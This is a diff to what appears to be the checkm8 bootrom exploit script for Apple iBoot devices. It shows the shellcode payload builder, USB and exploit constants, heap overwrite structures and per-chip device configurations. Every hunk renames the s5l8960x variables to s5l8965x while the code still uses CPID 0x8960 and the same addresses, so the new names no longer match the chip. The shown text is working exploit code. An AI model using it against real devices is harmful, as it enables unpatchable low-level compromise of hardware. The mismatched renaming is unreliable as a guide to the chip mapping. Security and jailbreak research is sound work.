@@ -213,7 +213,7 @@ def payload(cpid):
     assert len(s5l8955x_handler) <= PAYLOAD_SIZE_ARMV7
     return s5l8955x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8955x_shellcode)) + s5l8955x_handler
   if cpid == 0x8960:
-    constants_usb_s5l8960x = [
+    constants_usb_s5l8965x = [
                0x180380000, # 1 - LOAD_ADDRESS
         0x6578656365786563, # 2 - EXEC_MAGIC
         0x646F6E65646F6E65, # 3 - DONE_MAGIC
@@ -221,7 +221,7 @@ def payload(cpid):
         0x6D656D736D656D73, # 5 - MEMS_MAGIC
                0x10000CC78, # 6 - USB_CORE_DO_IO
     ]
-    constants_checkm8_s5l8960x = [
+    constants_checkm8_s5l8965x = [
                0x180086B58, # 1 - gUSBDescriptors
                0x180086CDC, # 2 - gUSBSerialNumber
                0x10000BFEC, # 3 - usb_create_string_descriptor
@@ -231,11 +231,11 @@ def payload(cpid):
         PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
                0x180086C70, # 8 - PAYLOAD_PTR
     ]
-    s5l8960x_handler   = asm_arm64_x7_trampoline(0x10000CFB4) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s5l8960x)[4:]
-    s5l8960x_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_s5l8960x)
-    assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
-    assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64
-    return s5l8960x_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode)) + s5l8960x_handler
+    s5l8965x_handler   = asm_arm64_x7_trampoline(0x10000CFB4) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s5l8965x)[4:]
+    s5l8965x_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_s5l8965x)
+    assert len(s5l8965x_shellcode) <= PAYLOAD_OFFSET_ARM64
+    assert len(s5l8965x_handler) <= PAYLOAD_SIZE_ARM64
+    return s5l8965x_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l8965x_shellcode)) + s5l8965x_handler
   if cpid == 0x8002:
     constants_usb_t8002 = [
                 0x48818000, # 1 - LOAD_ADDRESS
@@ -434,7 +434,7 @@ def all_exploit_configs():
   s5l8947x_overwrite = struct.pack('<20xI4x', 0x34000000)
   s5l895xx_overwrite = struct.pack('<20xI4x', 0x10000000)
   t800x_overwrite    = struct.pack('<20xI4x', 0x48818000)
-  s5l8960x_overwrite = struct.pack('<32xQ8x', 0x180380000)
+  s5l8965x_overwrite = struct.pack('<32xQ8x', 0x180380000)
   t8010_overwrite    = struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
   t8011_overwrite    = struct.pack('<32x2Q', t8011_nop_gadget, 0x1800B0800)
   t8015_overwrite    = struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
@@ -442,7 +442,7 @@ def all_exploit_configs():
   s5l8947x_overwrite_offset = 0x660
   s5l895xx_overwrite_offset = 0x640
   t800x_overwrite_offset    = 0x5C0
-  s5l8960x_overwrite_offset = 0x580
+  s5l8965x_overwrite_offset = 0x580
   t8010_overwrite_offset    = 0x580
   t8011_overwrite_offset    = 0x540
   t8015_overwrite_offset    = 0x500
@@ -451,7 +451,7 @@ def all_exploit_configs():
     DeviceConfig('iBoot-1458.2',          0x8947,  626, s5l8947x_overwrite, s5l8947x_overwrite_offset, None, None), # S5L8947 (DFU loop)     1.97 seconds
     DeviceConfig('iBoot-1145.3'  ,        0x8950,  659, s5l895xx_overwrite, s5l895xx_overwrite_offset, None, None), # S5L8950 (buttons)      2.30 seconds
     DeviceConfig('iBoot-1145.3.3',        0x8955,  659, s5l895xx_overwrite, s5l895xx_overwrite_offset, None, None), # S5L8955 (buttons)      2.30 seconds
-    DeviceConfig('iBoot-1704.10',         0x8960, 7936, s5l8960x_overwrite, s5l8960x_overwrite_offset, None, None), # S5L8960 (buttons)     13.97 seconds
+    DeviceConfig('iBoot-1704.10',         0x8960, 7936, s5l8965x_overwrite, s5l8965x_overwrite_offset, None, None), # S5l8965 (buttons)     13.97 seconds
     DeviceConfig('iBoot-2651.0.0.1.31',   0x8002, None,    t800x_overwrite, t800x_overwrite_offset,    5,    1), # T8002 (DFU loop)  NEW: 1.27 seconds
     DeviceConfig('iBoot-2651.0.0.3.3',    0x8004, None,    t800x_overwrite, t800x_overwrite_offset,    5,    1), # T8004 (buttons)   NEW: 1.06 seconds
     DeviceConfig('iBoot-2696.0.0.1.33',   0x8010, None,    t8010_overwrite, t8010_overwrite_offset,    5,    1), # T8010 (buttons)   NEW: 0.68 seconds
